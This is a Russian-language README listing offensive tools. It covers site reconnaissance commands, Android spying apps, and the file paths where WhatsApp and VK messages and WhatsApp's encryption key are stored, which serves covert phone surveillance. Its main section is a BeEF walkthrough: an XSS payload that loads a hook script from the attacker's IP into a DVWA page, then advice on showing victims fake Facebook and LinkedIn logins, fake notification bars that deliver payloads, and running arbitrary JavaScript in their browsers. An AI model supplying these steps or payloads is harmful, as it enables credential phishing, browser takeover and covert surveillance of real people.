# Collection of utilities




## общие ресурсы

#### OWASP (https://www.owasp.org/index.php/Main_Page)

это открытый проект по обеспечению безопасности веб-приложений. На нем содержится большое количество материалов, гайдов по тестированию, разные чек-листы и другие материалы
обязательное изучения:

>https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
>https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

#### exploit-db https://www.exploit-db.com/

#### IPper https://ipper.ru/

#### ';--have i been pwned? https://haveibeenpwned.com/

#### браузер


## сканирование сайта

#### Dnsrecon (Kali)
Утилита на Python, которая отображает хосты, домены и другую информация о сайте. 

Для базового тестирования:
> dnsrecon -d site.com

для брута деректорий:
> dnsrecon -d c -D /root/dnsmapCommonSubdomains.txt

#### Dirb (Kali)
Он покажет всевозможные существующие страницы, где ответы не содержат код страницы 404. 
> dirb site.com

#### Nmap (Kali)
Сетевой сканер, который позволяет показать какие порты используются и что на них установлено.





## Wordpress

#### WPscan (Kali)
> wpscan -u site.com

после найти уязвимости: exploit-db


## андроид

### слежку

ACR или ACRPRO (https://nllapps.com/)
AirFroid
Talklog (https://talklog.tools/ru/)
NeoSpy (https://neospy.net/account/)

#### сообщениям WhatsApp

##### контакты

> /data/data/com.whatsapp/databases/wa.db

##### сообщения

> /data/data/com.whatsapp/databases/msgstore.db

##### ключ шифрования

> /data/data/com.whatsapp/files/key

##### резервные хранятся

> /sdcard/WhatsApp/Databases/msgstore.db.crypt7

### анализ

Andriller (https://www.andriller.com/download/)

WhatsApp Viewer (https://andreas-mausch.de/whatsapp-viewer/): Small tool to display chats from the Android msgstore.db.

### VK Coffee

#### Сообщения 

> /data/data/su.operator555.vkcoffee/databases/databaseVerThree.db 
> /data/data/su.operator555.vkcoffee/databases.vk.db

#### Группы

> /data/data/su.operator555.vkcoffee/databases/groups.db

### VK official

#### Сообщения

> /data/data/com.vkontakte.android/databases/vkim.sqlite
> /data/data/com.vkontakte.android/databases/vk.db

#### Список групп

> /data/data/com.vkontakte.android/databases/groups.db

### Kate Mobile

#### Сообщения+группы 

> /data/data/com.prem.kate_new_6/databases/kate.db

## пользователь — браузер

#### BeFF 
это инструмент работает через браузеры. Проще говоря, Биф это комбайн для эксплуатации XSS и используется при проведение MITM атак.

Главная потребность после получения сессии — закрепиться в системе. Наша сессия будет активна, пока жертва не закроет страницу. Для этого нужно воспользоваться дополнительными инструментами, которые интегрированы в утилиту. 

> sudo beef-xss

> http://localhost:3000/ui/panel/ (beef / beff)

> <script src = "http: //192.168.24.99.06000/hook.js"> </ script>

> // где вместо 192.168.24.99 нужно указать IP своей машины, на которой установлен Beef. 

> Находим целевую страницу, где можно вставить нашу ссылку. В моем случае:

> http://192.168.24.98/DVWA-master/vulnerabilities/xss_r/?name=

> http://192.168.24.98/DVWA-master/vulnerabilities/xss_r/?name=<script src="http://192.168.24.99:3000/hook.js"></script>

Далее вмонтируем этот скрипт в любую форму, которая поддерживает XSS. (если вам интересно, то плагин называется HackBar). После выполнения запроса получаем новый Online Browser. После подключения, вы сможете следить за тем, чем занимается цель, какая у нее позиция курсора и что происходит. Это очень важная информация для получения подходящего момента проведения атаки. 

После того, как вы получили логи, где вам видно, например, что пользователь перешел на сайт Facebook, мы можем ему подсунуть фейковую авторизацию. Для этого будем использовать команду Pretty theft из раздела Social Engineering. 

С помощью этой команды можно организовать фейковую авторизацию для Linkedin, Facebook, Windows, YouTube, Yammer, IOS, Generic. Также можно поиграть с цветами форм и их адаптацией к максимально реальным. Очень хорошая вещь, особенно если наша цель сейчас находится на сайте. 

Также есть крутая атака с поддельным уведомлением в статус баре. Для этого можно воспользоваться Fake Notidication Bar для конкретного браузера. В результате жертва получает вот такое уведомление, что максимально приближено к реальному. вы можете настроить под себя надпись и ссылку, по которой перейдет цель. Сюда нужно добавлять полезные нагрузки для получения полного контроля над машиной нашей цели.

###### Chrome Extension, под названием Screenshot
можно сделать скриншот (Пока это работает только для Chrome).

###### возможности выполнения любого javascript на стороне цели
Для реализации вам необходимо перейти в Misc и выбрать Raw JavaScript. После этого можно будет внедрить любой код и нажать Execute.

## тренинг

#### Damn Vulnerable Web Application (DVWA) (http://www.dvwa.co.uk/)

Это сайт на PHP, который демонстрирует ряд уязвимостей для изучения

#### Buggy web application (bWAPP) (http://www.itsecgames.com/)

Это открытое приложение и включает в себя около сотни уязвимостей, которые классифицируются по OWASP. Также есть готовая сборка для виртуальной машины bee-box.

## безопасность

пароль утилит: Keepass https://keepass.info/

WebRTC: может «засветить» реальный IP юзера, несмотря на использование VPN, Tor, Proxy.

# I just found the contents of this repository around the web.
